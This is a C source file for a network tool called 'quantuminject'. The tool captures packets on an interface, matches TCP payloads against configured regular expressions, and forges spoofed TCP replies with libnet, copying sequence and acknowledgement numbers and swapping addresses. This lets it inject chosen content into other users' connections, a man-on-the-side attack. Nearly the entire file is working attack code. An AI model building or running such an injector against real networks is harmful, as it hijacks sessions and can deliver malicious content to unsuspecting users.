#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <linux/if_ether.h>

#include <pcap/pcap.h>
#include <libnet.h>
#include "log.h"
#include "util.h"
#include "conf.h"

extern char * optarg;
static const int ARG_LEN = 256;
static const char * DEFAULT_INTERFACE = "eth0";

static const int PCRE_VEC_LEN = 32;



void send_spoof_response(user_data * pdata, struct ethhdr * ehdr,
                         struct iphdr * ip, struct tcphdr * tcp);

void pcap_callback(u_char * user,
                   const struct pcap_pkthdr *h, const u_char *bytes);

int main(int argc, char *argv[])
{
    if (argc < 2) {
        printf ("Invalid argument!\n"
                "quantuminject [-i interface] [-r regexp]"
                "[-d datafile] expression\n");
        return -1;
    }

    char interface[ARG_LEN];
    strncpy(interface, DEFAULT_INTERFACE, ARG_LEN);
    char regexp[ARG_LEN];
    memset(regexp, 0, ARG_LEN);
    char datafile[ARG_LEN];
    char exp[ARG_LEN];

    int op = 0;
    while ((op = getopt(argc, argv, "i:r:d:")) != -1) {
        switch (op) {
        case 'i':
            strncpy(interface, optarg, ARG_LEN);
            DEBUG_LOG ("Listen on network device: %s", interface);
            break;

        case 'r':
            strncpy(regexp, optarg, ARG_LEN);
            DEBUG_LOG ("The regexp is: %s", regexp);
            break;

        case 'd':
            strncpy(datafile, optarg, ARG_LEN);
            DEBUG_LOG ("Read the datafile: %s", datafile);
            break;

        default:
            DEBUG_LOG ("Invalid argument! "
                       "quantuminject [-i interface] [-r regexp]"
                       "[-d datafile] expression");
            return -1;
        }
    }

    if (NULL == argv[optind]) {
        DEBUG_LOG ("Invalid argument! "
                   "%d-th arg is NULL", optind);
        return -1;
    }
    strncpy(exp, argv[optind], ARG_LEN);
    DEBUG_LOG("%d-th arg is exp = %s", optind, exp);

    ///////////////////////////////////////////////////

    user_data udata;
    memset(&udata, 0, sizeof(user_data));

    udata.inject_socket = create_injection_socket(interface);
    if (udata.inject_socket == -1) {
        fprintf(stderr, "create_injection_socket failed\n");
        return -1;
    }

    char errbuf[512];
    struct bpf_program bpf;
    pcap_t * pf;
    pf = pcap_open_live(interface, 0xffff, 1, 1, errbuf);
    if (pf == NULL) {
        printf("Error rerturned from pcap_open_live: %s\n", errbuf);
        return -1;
    }
    if (pcap_compile(pf, &bpf, exp, 0, 0) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n",
                exp, pcap_geterr(pf));
    }
        
    if (pcap_setfilter(pf, &bpf) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n",
                exp, pcap_geterr(pf));
    }

    char lnet_err[LIBNET_ERRBUF_SIZE];
    udata.lnet = libnet_init(LIBNET_LINK_ADV, interface, lnet_err);
    if(udata.lnet == NULL){
        printf("Error in libnet_init: %s\n", lnet_err);
        return -1;
    }
    udata.conf = parse_config_file(datafile);
    if (udata.conf == NULL) {
        printf("Fail to parse_config_file\n");
        return -1;
    }

    if (strlen(regexp) > 0) {
        const char *pcre_err_str;
        int err_off;
        udata.regexp = pcre_compile(regexp, 0, &pcre_err_str, &err_off, NULL);
        if(udata.regexp == NULL) {
            printf("ERROR: Could not compile '%s': %s\n", regexp, pcre_err_str);
            return -1;
        }
    } else {
        udata.regexp = NULL;
    }

    pcap_loop(pf, 100, pcap_callback, (u_char*)&udata);

    pcre_free(udata.regexp);
    pcap_freecode(&bpf);
    pcap_close(pf);
    return 0;
}


void pcap_callback(u_char *user, const struct pcap_pkthdr *h, const u_char *packet)
{
    int sub_str_vec[PCRE_VEC_LEN];
    user_data * pdata = (user_data *)user;
    struct iphdr *ip;
    struct tcphdr *tcp;

    char *payload;                    /* Packet payload */
    int iphdr_len;
    int tcphdr_len;   /* TCP header size */

    int size_payload;

    struct ethhdr * ehdr = (struct ethhdr *)packet;

    ip = (struct iphdr*)(packet + SIZE_ETHERNET);
    iphdr_len = ip->ihl * 4;

    if (ip->protocol != IPPROTO_TCP) {
        printf("[DEBUG] Other protocol we do not support yet\n");
        return;        
    }

    tcp = (struct tcphdr*)(packet + SIZE_ETHERNET + iphdr_len);
    tcphdr_len = tcp->doff * 4;
    if (tcphdr_len < 20) {
        printf("[DEBUG] Invalid TCP header length: %u bytes\n",
               tcphdr_len);
        return;
    }

    payload = (char *)(packet + SIZE_ETHERNET + iphdr_len + tcphdr_len);
    size_payload = ntohs(ip->tot_len) - (iphdr_len + tcphdr_len);

    //DEBUG_LOG("Payload %d bytes", size_payload);
    
    if (pdata->regexp) {
        int pcre_ret = pcre_exec(pdata->regexp, NULL, payload,
                                 size_payload, 0, 0, sub_str_vec, PCRE_VEC_LEN);
        if (pcre_ret < 0) {
            //DEBUG_LOG("Cannot match regular expression.");
            goto END_OF_CB;
        }
        DEBUG_LOG("Payload matched with regular expression.");
    }

    if (pcre_exec(pdata->conf->match, NULL, payload, size_payload, 0, 0,
                  sub_str_vec, PCRE_VEC_LEN) >=0) {

        DEBUG_LOG("Payload matched !! Begin spoofing now ..............");
        // DEBUG_LOG("payload: [%s]", payload);
        send_spoof_response(pdata, ehdr, ip, tcp);            
    }

END_OF_CB:
    fflush(stdout);
}



void send_spoof_response(user_data * pdata, struct ethhdr * ehdr,
                         struct iphdr * ip_hdr, struct tcphdr * tcp_hdr)
{
    conf_entry * conf = pdata->conf;

    u_int ack = ntohl(tcp_hdr->seq) + 
            ( ntohs(ip_hdr->tot_len) - ip_hdr->ihl * 4 - tcp_hdr->doff * 4 );
    DEBUG_LOG("ACK number is %u, SYN %u", ack, ntohl(tcp_hdr->ack_seq));
    printf("[DEBUG] Received packet %s:%d -> ",
           inet_ntoa((struct in_addr){ip_hdr->saddr}),
           ntohs(tcp_hdr->source));
    printf("%s:%d\n", inet_ntoa((struct in_addr){ip_hdr->daddr}),
           ntohs(tcp_hdr->dest));


    pdata->tcp_t = libnet_build_tcp(
        ntohs(tcp_hdr->dest), // source port
        ntohs(tcp_hdr->source), // dest port
        ntohl(tcp_hdr->ack_seq), // sequence number
        ack, // ack number
        TH_PUSH | TH_ACK | TH_FIN, // flags, use TH_FIN to close the connection
        0xffff, // window size
        0, // checksum
        0, // urg ptr
        20 + conf->response_len, // total length of the TCP packet
        (u_int8_t*)conf->response, // response
        conf->response_len, // response_length
        pdata->lnet, // libnet_t pointer
        pdata->tcp_t // ptag
                                    );

    //DEBUG_LOG("Sending packets from %d to %d", tcp_hdr->dest, tcp_hdr->source);
    if(pdata->tcp_t == -1) {
        printf("libnet_build_tcp returns error: %s\n",
               libnet_geterror(pdata->lnet));
        return;
    }

    pdata->ip_t = libnet_build_ipv4(
        40 + conf->response_len, // length
        0, // TOS bits
        ip_hdr->id + 1, // IPID (need to calculate)
        0, // fragmentation
        0x80, // TTL
        6, // protocol
        0, // checksum
        ip_hdr->daddr, // source address
        ip_hdr->saddr, // dest address
        NULL, // response
        0, // response length
        pdata->lnet, // libnet_t pointer
        pdata->ip_t // ptag
                                    );

    if(pdata->ip_t == -1){
        printf("libnet_build_ipv4 returns error: %s\n",
               libnet_geterror(pdata->lnet));
        return;
    }

    // copy the libnet packets to to a buffer to send raw..
    char packet_buff[0xffff];
    memcpy(packet_buff, ehdr, SIZE_ETHERNET);
    struct ethhdr *new_ehdr = (struct ethhdr *)packet_buff;

    // swap MAC addresses
    uint8_t tmp_addr[ETH_ALEN];
    memcpy(tmp_addr, new_ehdr->h_dest, ETH_ALEN);
    memcpy(new_ehdr->h_dest, new_ehdr->h_source, ETH_ALEN);
    memcpy(new_ehdr->h_source, tmp_addr, ETH_ALEN);

    libnet_ptag_t t = libnet_build_ethernet(
        new_ehdr->h_dest,  /* ethernet destination */
        new_ehdr->h_source, /* ethernet source */
        ETHERTYPE_IP,   /* protocol type */
        NULL,         /* payload */
        0,            /* payload size */
        pdata->lnet,  /* libnet handle */
        0);         /* libnet id */
    if (t == -1) {
        fprintf(stderr, "Can't build ethernet header: %s\n",
                libnet_geterror(pdata->lnet));
        return;
    }
    //////////////For Debugging ///////////////////
    /* int i; */
    /* printf("Sending packet, MAC src:"); */
    /* for (i = 0; i < ETH_ALEN; ++i) { */
    /*     printf("%x:", new_ehdr->h_source[i]); */
    /* } */
    /* printf(" mac dest:"); */
    /* for (i = 0; i < ETH_ALEN; ++i) { */
    /*     printf("%x:", new_ehdr->h_dest[i]); */
    /* } */
    /* printf ("\n"); */
    ///////////////////////////////////////////////
    int c = libnet_write(pdata->lnet);
    if (c == -1) {
        fprintf(stderr, "Write error: %s\n", libnet_geterror(pdata->lnet));
        return;
    }
}
